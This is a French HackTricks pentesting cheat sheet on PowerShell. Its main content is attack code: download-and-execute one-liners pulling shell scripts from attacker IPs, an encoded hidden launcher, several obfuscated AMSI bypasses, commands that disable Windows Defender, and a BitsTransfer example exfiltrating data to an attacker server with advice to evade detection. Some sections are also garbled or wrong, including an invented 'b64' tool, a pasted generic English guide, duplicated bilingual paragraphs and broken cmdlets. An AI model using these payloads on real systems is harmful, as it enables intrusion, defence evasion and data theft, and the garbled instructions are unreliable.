# PowerShell de base pour les pentesteurs

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Emplacements PowerShell par d√©faut
```powershell
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell
```
## Commandes de base de PowerShell pour commencer

PowerShell est un outil puissant pour les pentesteurs qui souhaitent exploiter les fonctionnalit√©s de Windows. Voici quelques commandes de base pour vous aider √† d√©marrer :

### Obtenir des informations syst√®me

La commande `Get-ComputerInfo` permet d'obtenir des informations d√©taill√©es sur le syst√®me d'exploitation, le mat√©riel et les logiciels install√©s.

```powershell
Get-ComputerInfo
```

### Obtenir la liste des utilisateurs

La commande `Get-LocalUser` permet d'obtenir la liste des utilisateurs locaux sur la machine.

```powershell
Get-LocalUser
```

### Obtenir la liste des processus en cours d'ex√©cution

La commande `Get-Process` permet d'obtenir la liste des processus en cours d'ex√©cution sur la machine.

```powershell
Get-Process
```

### Obtenir la liste des services

La commande `Get-Service` permet d'obtenir la liste des services en cours d'ex√©cution sur la machine.

```powershell
Get-Service
```

### Obtenir la liste des connexions r√©seau

La commande `Get-NetTCPConnection` permet d'obtenir la liste des connexions TCP actives sur la machine.

```powershell
Get-NetTCPConnection
```

### Obtenir la liste des fichiers d'un r√©pertoire

La commande `Get-ChildItem` permet d'obtenir la liste des fichiers et des dossiers d'un r√©pertoire sp√©cifi√©.

```powershell
Get-ChildItem C:\chemin\vers\le\r√©pertoire
```

### Obtenir des informations sur un fichier

La commande `Get-Item` permet d'obtenir des informations d√©taill√©es sur un fichier sp√©cifi√©.

```powershell
Get-Item C:\chemin\vers\le\fichier
```

Ces commandes de base vous aideront √† commencer √† explorer et √† analyser un syst√®me Windows √† l'aide de PowerShell.
```powershell
Get-Help * #List everything loaded
Get-Help process #List everything containing "process"
Get-Help Get-Item -Full #Get full helpabout a topic
Get-Help Get-Item -Examples #List examples
Import-Module <modulepath>
Get-Command -Module <modulename>
```
## T√©l√©charger et ex√©cuter

To download and execute a file using PowerShell, you can use the following command:

```powershell
Invoke-WebRequest -Uri <URL> -OutFile <OutputFile>; .\<OutputFile>
```

Replace `<URL>` with the URL of the file you want to download, and `<OutputFile>` with the desired name for the downloaded file.

This command uses the `Invoke-WebRequest` cmdlet to download the file from the specified URL and save it to the local system. The `-OutFile` parameter specifies the name and location of the output file.

After downloading the file, the command uses the dot sourcing technique (`.`) to execute the downloaded file.

Keep in mind that downloading and executing files from untrusted sources can be dangerous. Always exercise caution and ensure the files you download are from trusted sources.
```powershell
g
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile - #From cmd download and execute
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
iex (iwr '10.10.14.9:8000/ipw.ps1') #From PSv3

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.14.9:8000/ipw.ps1',$false);$h.send();iex $h.responseText
$wr = [System.NET.WebRequest]::Create("http://10.10.14.9:8000/ipw.ps1") $r = $wr.GetResponse() IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd(

#https://twitter.com/Alh4zr3d/status/1566489367232651264
#host a text record with your payload at one of your (unburned) domains and do this:
powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]
```
### T√©l√©chargement et ex√©cution en arri√®re-plan avec contournement de l'AMSI

L'AMSI (Antimalware Scan Interface) est une interface de programmation qui permet aux applications de s√©curit√© de scanner le contenu des scripts PowerShell. Cependant, en tant que pentester, il peut √™tre n√©cessaire de contourner l'AMSI pour ex√©cuter des scripts malveillants sans √™tre d√©tect√©.

Voici un exemple de script PowerShell qui t√©l√©charge et ex√©cute un fichier en arri√®re-plan tout en contournant l'AMSI :

```powershell
# Contournement de l'AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# T√©l√©chargement du fichier
$url = "URL_DU_FICHIER"
$output = "CHEMIN_DE_DESTINATION"
$client = New-Object System.Net.WebClient
$client.DownloadFile($url, $output)

# Ex√©cution du fichier en arri√®re-plan
$bytes = [System.IO.File]::ReadAllBytes($output)
[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, @())
```

Assurez-vous de remplacer "URL_DU_FICHIER" par l'URL du fichier que vous souhaitez t√©l√©charger, et "CHEMIN_DE_DESTINATION" par le chemin de destination o√π vous souhaitez enregistrer le fichier.

Ce script d√©sactive l'AMSI en modifiant une variable interne, puis utilise la classe `System.Net.WebClient` pour t√©l√©charger le fichier sp√©cifi√©. Ensuite, il lit les octets du fichier t√©l√©charg√© et les charge en tant qu'assembly, puis invoque le point d'entr√©e de cet assembly pour l'ex√©cuter en arri√®re-plan.

Il est important de noter que l'utilisation de techniques de contournement de l'AMSI peut √™tre consid√©r√©e comme ill√©gale et contraire √† l'√©thique si elle est utilis√©e sans autorisation appropri√©e.
```powershell
Start-Process -NoNewWindow powershell "-nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA="
```
### Utilisation de b64 depuis Linux

The `b64` command-line tool is a useful utility for encoding and decoding Base64 data. It is commonly used in various scenarios, including penetration testing and data manipulation. In this guide, we will explore how to use `b64` from a Linux environment.

#### Installation

To install `b64`, you can use the following command:

```bash
sudo apt-get install b64
```

#### Encoding Data

To encode data using `b64`, you can use the following syntax:

```bash
b64 -e <input_file> -o <output_file>
```

Replace `<input_file>` with the path to the file you want to encode, and `<output_file>` with the desired name for the encoded file. For example:

```bash
b64 -e secret.txt -o encoded.txt
```

This command will encode the contents of `secret.txt` and save the encoded data to `encoded.txt`.

#### Decoding Data

To decode data using `b64`, you can use the following syntax:

```bash
b64 -d <input_file> -o <output_file>
```

Replace `<input_file>` with the path to the file you want to decode, and `<output_file>` with the desired name for the decoded file. For example:

```bash
b64 -d encoded.txt -o secret.txt
```

This command will decode the contents of `encoded.txt` and save the decoded data to `secret.txt`.

#### Conclusion

The `b64` tool is a handy utility for encoding and decoding Base64 data in a Linux environment. By following the instructions in this guide, you can easily encode and decode files using `b64` for various purposes.
```powershell
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
```
## T√©l√©chargement

### System.Net.WebClient
```powershell
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
```
### Invoke-WebRequest

La commande `Invoke-WebRequest` est utilis√©e pour envoyer des requ√™tes HTTP et HTTPS √† un serveur web et r√©cup√©rer les r√©ponses. Cela peut √™tre utile lors de tests de p√©n√©tration pour r√©cup√©rer des informations sensibles ou exploiter des vuln√©rabilit√©s.

Voici un exemple d'utilisation de la commande `Invoke-WebRequest` pour r√©cup√©rer le contenu d'une page web :

```powershell
$response = Invoke-WebRequest -Uri "https://www.example.com"
$response.Content
```

Dans cet exemple, la commande `Invoke-WebRequest` est utilis√©e pour envoyer une requ√™te GET √† l'URL sp√©cifi√©e (`https://www.example.com`). La r√©ponse du serveur est stock√©e dans la variable `$response`. Ensuite, le contenu de la r√©ponse est affich√© en utilisant la propri√©t√© `Content` de l'objet `$response`.

La commande `Invoke-WebRequest` peut √©galement √™tre utilis√©e pour envoyer des requ√™tes POST, sp√©cifier des en-t√™tes personnalis√©s, g√©rer des cookies, et bien plus encore. Elle offre une grande flexibilit√© pour interagir avec des serveurs web lors de tests de p√©n√©tration.
```powershell
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
```
### Wget

Wget is a command-line utility that allows you to download files from the web. It supports downloading files using various protocols such as HTTP, HTTPS, and FTP. Wget is commonly used in penetration testing to retrieve files from target systems.

To use Wget, you need to open a command prompt or terminal and enter the following command:

```
wget [URL]
```

Replace `[URL]` with the URL of the file you want to download. Wget will then retrieve the file and save it to your current directory.

Wget also supports options that allow you to customize the download process. For example, you can use the `-O` option to specify a different name for the downloaded file, or the `-P` option to specify a different directory to save the file in.

Here are some examples of how you can use Wget:

- Download a file from a specific URL:
```
wget https://example.com/file.txt
```

- Download a file and save it with a different name:
```
wget -O newfile.txt https://example.com/file.txt
```

- Download a file and save it to a specific directory:
```
wget -P /path/to/directory https://example.com/file.txt
```

Wget is a powerful tool that can be used for various purposes, including downloading files during penetration testing. It is important to use it responsibly and within the boundaries of the law.
```powershell
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"
```
### BitsTransfer

BitsTransfer est un outil int√©gr√© √† PowerShell qui permet de transf√©rer des fichiers en utilisant le protocole Background Intelligent Transfer Service (BITS). BITS est un service de transfert de fichiers en arri√®re-plan qui utilise la bande passante disponible de mani√®re efficace, en s'adaptant automatiquement aux conditions du r√©seau.

L'utilisation de BitsTransfer dans le cadre d'un test de p√©n√©tration peut √™tre b√©n√©fique pour t√©l√©charger des fichiers malveillants ou exfiltrer des donn√©es sensibles. Voici quelques exemples d'utilisation de BitsTransfer dans un sc√©nario de test de p√©n√©tration :

#### T√©l√©chargement de fichiers malveillants

BitsTransfer peut √™tre utilis√© pour t√©l√©charger des fichiers malveillants √† partir d'un serveur distant. Cela peut √™tre utile pour tester la r√©action des syst√®mes de s√©curit√© et des logiciels antivirus.

```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source http://example.com/malware.exe -Destination C:\Temp\malware.exe
```

#### Exfiltration de donn√©es sensibles

BitsTransfer peut √©galement √™tre utilis√© pour exfiltrer des donn√©es sensibles d'un syst√®me compromis vers un serveur contr√¥l√© par un attaquant. Cela peut inclure des fichiers contenant des informations confidentielles ou des journaux d'activit√©.

```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source C:\SensitiveData\* -Destination http://attacker-server.com
```

Il est important de noter que l'utilisation de BitsTransfer peut √™tre d√©tect√©e par les syst√®mes de s√©curit√© et les logiciels antivirus. Par cons√©quent, il est recommand√© de prendre des mesures suppl√©mentaires pour masquer ces activit√©s, telles que l'utilisation de techniques d'√©vasion ou de chiffrement des donn√©es.
```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
# OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
## Base64 Kali & EncodedCommand

Lors de l'ex√©cution de commandes PowerShell sur un syst√®me Windows, il peut √™tre n√©cessaire d'encoder la commande pour contourner les restrictions de s√©curit√©. Une m√©thode couramment utilis√©e consiste √† utiliser l'option `-EncodedCommand` de PowerShell pour ex√©cuter une commande encod√©e en Base64.

Pour encoder une commande en Base64, vous pouvez utiliser la commande suivante dans Kali Linux :

```bash
echo "Commande √† encoder" | base64
```

Remplacez "Commande √† encoder" par la commande que vous souhaitez encoder. Par exemple, si vous souhaitez encoder la commande `Get-Process`, vous pouvez ex√©cuter la commande suivante :

```bash
echo "Get-Process" | base64
```

Cela vous donnera la sortie encod√©e en Base64 de la commande. Vous pouvez copier cette sortie et l'utiliser avec l'option `-EncodedCommand` de PowerShell.

Voici un exemple de la fa√ßon dont vous pouvez ex√©cuter une commande encod√©e en Base64 avec PowerShell :

```powershell
powershell.exe -EncodedCommand "VGVzdC1Qcm9jZXNz"
```

Remplacez "VGVzdC1Qcm9jZXNz" par la sortie encod√©e en Base64 de la commande que vous souhaitez ex√©cuter.

L'utilisation de l'option `-EncodedCommand` permet d'ex√©cuter des commandes PowerShell encod√©es en Base64 sans avoir √† √©crire de script ou √† cr√©er un fichier s√©par√©. Cela peut √™tre utile lors de l'ex√©cution de commandes √† distance ou lors de l'exploitation de vuln√©rabilit√©s.
```powershell
kali> echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
PS> powershell -EncodedCommand <Base64>
```
## [Politique d'ex√©cution](../authentication-credentials-uac-and-efs.md#ps-execution-policy)

## [Langage restreint](broken-reference/)

## [Politique AppLocker](broken-reference/)

## Activer WinRM (PS √† distance)
```powershell
enable-psremoting -force #This enables winrm

# Change NetWorkConnection Category to Private
#Requires -RunasAdministrator

Get-NetConnectionProfile |
Where{ $_.NetWorkCategory -ne 'Private'} |
ForEach {
$_
$_|Set-NetConnectionProfile -NetWorkCategory Private -Confirm
}
```
## D√©sactiver Defender

{% code overflow="wrap" %}
```powershell
# Check status
Get-MpComputerStatus
Get-MpPreference | select Exclusion* | fl #Check exclusions
# Disable
Set-MpPreference -DisableRealtimeMonitoring $true
#To completely disable Windows Defender on a computer, use the command:
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
# Set exclusion path
Set-MpPreference -ExclusionPath (pwd) -disablerealtimemonitoring
Add-MpPreference -ExclusionPath (pwd)

# Check exclusions configured via GPO
Parse-PolFile .\Registry.pol

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions
ValueName : Exclusions_Paths
ValueType : REG_DWORD
ValueLength : 4
ValueData : 1

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions\Paths
ValueName : C:\Windows\Temp
ValueType : REG_SZ
ValueLength : 4
ValueData : 0
```
{% endcode %}

### Contournement de l'AMSI

Le fichier **`amsi.dll`** est **charg√©** dans votre processus et poss√®de les **exports** n√©cessaires pour interagir avec n'importe quelle application. Et comme il est charg√© dans l'espace m√©moire d'un processus que vous **contr√¥lez**, vous pouvez modifier son comportement en **√©crasant les instructions en m√©moire**. Cela le rend ind√©tectable.

Par cons√©quent, l'objectif des contournements de l'AMSI que vous allez r√©aliser est de **modifier les instructions de cette DLL en m√©moire pour rendre la d√©tection inutile**.

Page web du g√©n√©rateur de contournement de l'AMSI : [**https://amsi.fail/**](https://amsi.fail/)
```powershell
# A Method
[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)

# Another: from https://github.com/tihanyin/PSSW100AVB/blob/main/AMSI_bypass_2021_09.ps1
$A="5492868772801748688168747280728187173688878280688776828"
$B="1173680867656877679866880867644817687416876797271"
[Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " " ).
GetField([string](38..51|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " ",'NonPublic,Static').
SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
&( $SHELLid[1]+$SHELlId[13]+'X') (NeW-OBJEct sYStEm.iO.coMPrESSIOn.defLAtEstReam( [iO.meMorYStReAm] [cOnvErt]::froMBaSE64StRINg( 'rVHRasJAEHzvdwhGkBAhLUXwYU7i2aKFq4mQBh8Sc6bBM5HkYmq/vruQfkF7L3s7s8vM3CXv+nRw0bb6kpm7K7UN71ftjJwk1F/WDapjnZdVcZjPo6qku+aRnW0Ic5JlXd10Y4lcNfVFpK1+8gduHPXiEestcggD6WFTiDfIAFkhPiGP+FDCQkbce1j6UErMsFbIesYD3rtCPhOPDgHtKfENecZe0TzVDNRjsRhP6LCpValN/g/GYzZGxlMlXiF9rh6CGISToZ6Nn3+Fp3+XCwtxY5kIlF++cC6S2WIDEfJ7xEPeuMeQdaftPjUdfVLVGTMd2abTk4cf'), [sysTEm.iO.cOmpResSioN.COMprEssiOnMOde]::decOMPRESs ) | foreAch{NeW-OBJEct iO.STREaMREadER( $_ , [teXt.ENCoDiNg]::aScii )}).REadtoenD( )

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
${2}=[Ref].Assembly.GetType('Sy'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGUA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQAuAE0A')))+'an'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBnAGUA')))+'m'+'en'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAAuAEEAdQA=')))+'t'+'om'+'at'+'io'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgAuAEEA')))+'ms'+'i'+'U'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABpAGwA')))+'s')
${1}=${2}.GetField('am'+'s'+'iI'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBpAHQA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAA=')))+'ed','No'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBQAHUA')))+'bl'+'i'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwAsAFMA')))+'ta'+'ti'+'c')
${1}.SetValue($null,$true)

# Another Method
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$field.SetValue($null,$true)

# AMSI Bypass in python
https://fluidattacks.com/blog/amsi-bypass-python/

# Testing for Amsi Bypass:
https://github.com/rasta-mouse/AmsiScanBufferBypass

# Amsi-Bypass-Powershell
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

https://blog.f-secure.com/hunting-for-amsi-bypasses/
https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
https://github.com/cobbr/PSAmsi/wiki/Conducting-AMSI-Scans
https://slaeryan.github.io/posts/falcon-zero-alpha.html
```
### Contournement AMSI 2 - Accrochage d'appel d'API g√©r√©

Consultez [**cet article pour plus d'informations d√©taill√©es**](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/)[ **et le code**](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/).

Cette nouvelle technique repose sur l'accrochage d'appels d'API des m√©thodes .NET. Il s'av√®re que les m√©thodes .NET doivent √™tre compil√©es en instructions machine natives en m√©moire, ce qui les rend tr√®s similaires aux m√©thodes natives. Ces m√©thodes compil√©es peuvent √™tre accroch√©es pour modifier le flux de contr√¥le d'un programme.

Les √©tapes pour effectuer l'accrochage d'appels d'API des m√©thodes .NET sont les suivantes :

1. Identifier la m√©thode cible √† accrocher
2. D√©finir une m√©thode avec le m√™me prototype de fonction que la cible
3. Utiliser la r√©flexion pour trouver les m√©thodes
4. S'assurer que chaque m√©thode a √©t√© compil√©e
5. Trouver l'emplacement de chaque m√©thode en m√©moire
6. Remplacer la m√©thode cible par des instructions pointant vers notre m√©thode malveillante

### Contournement AMSI 3 - Privil√®ge SeDebug

[**En suivant ce guide et ce code**](https://github.com/MzHmO/DebugAmsi), vous pouvez voir comment, avec suffisamment de privil√®ges pour d√©boguer des processus, vous pouvez cr√©er un processus powershell.exe, le d√©boguer, surveiller quand il charge `amsi.dll` et le d√©sactiver.

## Historique PS
```powershell
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```
## Obtenir les autorisations

To determine the permissions of a file or directory in PowerShell, you can use the `Get-Acl` cmdlet. This cmdlet retrieves the access control list (ACL) for the specified item.

```powershell
Get-Acl -Path C:\path\to\file.txt
```

This command will display the permissions associated with the specified file. The output will include information such as the owner, group, and access rules.

To retrieve the permissions for a directory and all its subdirectories, you can use the `-Recurse` parameter.

```powershell
Get-Acl -Path C:\path\to\directory -Recurse
```

This command will display the permissions for the specified directory and all its subdirectories.

By default, the output of `Get-Acl` is not very readable. To format the output in a more user-friendly way, you can use the `Format-List` cmdlet.

```powershell
Get-Acl -Path C:\path\to\file.txt | Format-List
```

This command will display the permissions in a list format, making it easier to read and understand.

In addition to `Get-Acl`, PowerShell also provides other cmdlets for managing permissions, such as `Set-Acl` for modifying permissions and `Test-Path` for checking if a file or directory exists.

By understanding how to retrieve and manage permissions in PowerShell, you can effectively assess the security of a Windows system during a penetration test.
```powershell
Get-Acl -Path "C:\Program Files\Vuln Services" | fl
```
## Version du syst√®me d'exploitation et correctifs

To determine the version of the operating system and the installed hotfixes, you can use the following PowerShell commands:

```powershell
# Get the operating system version
(Get-WmiObject -Class Win32_OperatingSystem).Caption

# Get the installed hotfixes
Get-HotFix
```

These commands will provide you with the necessary information to assess the current state of the operating system and identify any installed hotfixes.
```powershell
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
## Environnement

---

## Introduction

This guide provides an overview of basic PowerShell commands and techniques that can be useful for pentesters working on Windows systems. PowerShell is a powerful scripting language and command-line shell that is built on the .NET framework. It provides a wide range of functionalities for managing and automating Windows systems.

---

## PowerShell Basics

### Opening PowerShell

To open PowerShell, press `Win + X` and select "Windows PowerShell" from the menu. Alternatively, you can search for "PowerShell" in the Start menu and open it from there.

### Running PowerShell Commands

PowerShell commands, also known as cmdlets, follow a verb-noun syntax. To run a command, simply type it in the PowerShell window and press `Enter`. For example, to list all the files in a directory, you can use the `Get-ChildItem` cmdlet:

```powershell
Get-ChildItem
```

### Getting Help

To get help on a specific cmdlet, you can use the `Get-Help` cmdlet followed by the name of the cmdlet. For example, to get help on the `Get-ChildItem` cmdlet, you can use:

```powershell
Get-Help Get-ChildItem
```

### Running Scripts

PowerShell scripts are saved with a `.ps1` extension. To run a script, you can use the `.\` prefix followed by the script name. For example, if you have a script called `script.ps1`, you can run it using:

```powershell
.\script.ps1
```

---

## PowerShell for Pentesters

### System Information

To gather information about the system, you can use the following cmdlets:

- `Get-ComputerInfo`: Retrieves detailed information about the computer.
- `Get-WmiObject`: Retrieves information about Windows Management Instrumentation (WMI) objects.
- `Get-Process`: Retrieves information about running processes.

### Network Information

To gather information about the network, you can use the following cmdlets:

- `Get-NetAdapter`: Retrieves information about network adapters.
- `Get-NetIPAddress`: Retrieves information about IP addresses.
- `Test-NetConnection`: Tests network connectivity to a specific destination.

### User and Group Management

To manage users and groups, you can use the following cmdlets:

- `Get-LocalUser`: Retrieves information about local users.
- `Get-LocalGroup`: Retrieves information about local groups.
- `New-LocalUser`: Creates a new local user.
- `Add-LocalGroupMember`: Adds a user to a local group.

### File and Directory Operations

To perform file and directory operations, you can use the following cmdlets:

- `Get-ChildItem`: Retrieves files and directories in a specified location.
- `Copy-Item`: Copies files and directories.
- `Move-Item`: Moves files and directories.
- `Remove-Item`: Deletes files and directories.

### Registry Operations

To perform registry operations, you can use the following cmdlets:

- `Get-Item`: Retrieves registry keys and values.
- `Set-Item`: Sets registry keys and values.
- `New-Item`: Creates a new registry key.
- `Remove-Item`: Deletes a registry key.

---

## Conclusion

PowerShell is a versatile tool for managing and automating Windows systems. By familiarizing yourself with the basic commands and techniques covered in this guide, you can enhance your pentesting capabilities on Windows platforms.
```powershell
Get-ChildItem Env: | ft Key,Value #get all values
$env:UserName @Get UserName value
```
## Autres lecteurs connect√©s

When conducting a penetration test on a Windows system, it is important to gather as much information as possible about the target. One area that can provide valuable insights is the list of connected drives.

Lors de la r√©alisation d'un test de p√©n√©tration sur un syst√®me Windows, il est important de collecter autant d'informations que possible sur la cible. Une zone qui peut fournir des informations pr√©cieuses est la liste des lecteurs connect√©s.

In PowerShell, you can use the `Get-PSDrive` cmdlet to retrieve a list of all connected drives on the system. This includes not only local drives, but also network drives and other types of connected storage.

En PowerShell, vous pouvez utiliser la commande `Get-PSDrive` pour r√©cup√©rer une liste de tous les lecteurs connect√©s sur le syst√®me. Cela inclut non seulement les lecteurs locaux, mais aussi les lecteurs r√©seau et d'autres types de stockage connect√©s.

To view the list of connected drives, open a PowerShell session and run the following command:

Pour afficher la liste des lecteurs connect√©s, ouvrez une session PowerShell et ex√©cutez la commande suivante :

```powershell
Get-PSDrive
```

This will display a table with information about each connected drive, including the drive letter, drive type, and root path.

Cela affichera un tableau avec des informations sur chaque lecteur connect√©, y compris la lettre du lecteur, le type de lecteur et le chemin racine.

By examining the list of connected drives, you can gain insights into the system's storage configuration and potentially identify additional attack vectors.

En examinant la liste des lecteurs connect√©s, vous pouvez obtenir des informations sur la configuration de stockage du syst√®me et √©ventuellement identifier des vecteurs d'attaque suppl√©mentaires.
```powershell
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
### Corbeille

The Recycle Bin is a feature in Windows that allows you to temporarily store deleted files and folders. Instead of permanently deleting them, they are moved to the Recycle Bin where they can be restored if needed. This provides a safety net in case you accidentally delete something important.

La Corbeille est une fonctionnalit√© de Windows qui vous permet de stocker temporairement les fichiers et dossiers supprim√©s. Au lieu de les supprimer d√©finitivement, ils sont d√©plac√©s dans la Corbeille o√π ils peuvent √™tre restaur√©s si n√©cessaire. Cela offre une s√©curit√© en cas de suppression accidentelle d'un √©l√©ment important.
```powershell
$shell = New-Object -com shell.application
$rb = $shell.Namespace(10)
$rb.Items()
```
[https://jdhitsolutions.com/blog/powershell/7024/gestion-de-la-corbeille-avec-powershell/](https://jdhitsolutions.com/blog/powershell/7024/gestion-de-la-corbeille-avec-powershell/)

## Reconnaissance de domaine

{% content-ref url="powerview.md" %}
[powerview.md](powerview.md)
{% endcontent-ref %}

## Utilisateurs
```powershell
Get-LocalUser | ft Name,Enabled,Description,LastLogon
Get-ChildItem C:\Users -Force | select Name
```
## Cha√Æne s√©curis√©e en texte brut

Lors de l'ex√©cution de tests de p√©n√©tration sur des syst√®mes Windows, il peut √™tre n√©cessaire de convertir une cha√Æne s√©curis√©e en texte brut pour effectuer certaines op√©rations. PowerShell offre une fonctionnalit√© pour effectuer cette conversion.

La m√©thode `ConvertFrom-SecureString` de PowerShell permet de convertir une cha√Æne s√©curis√©e en texte brut. Voici comment l'utiliser :

```powershell
$secureString = Get-SecureString -AsPlainText "MotDePasse" -Force
$plainText = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))
```

